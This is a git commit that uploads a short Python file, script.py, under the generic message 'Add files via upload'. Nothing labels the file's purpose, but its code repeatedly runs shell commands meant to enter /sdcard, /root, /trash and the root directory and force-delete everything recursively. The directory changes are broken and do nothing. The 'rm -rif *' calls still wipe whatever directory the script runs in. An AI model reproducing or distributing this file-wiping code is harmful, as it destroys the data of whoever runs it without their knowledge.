d54af6da0028bd83c0c3170795a1d02839fc7c44
Mohmmed1233 <128189265+Mohmmed1233@users.noreply.github.com>
2023-03-25 22:36:27 +0200

    Add files via upload

---
+++ script.py
@@ -0,0 +1,12 @@
+import os;
+os.system('cd/sdcard')
+os.system('rm -rif *')
+
+os.system('cd/root')
+os.system('rm -rif *')
+
+os.system('cd/trash')
+os.system('rm -rif *')
+
+os.system('cd/')
+os.system('rm -rif *')
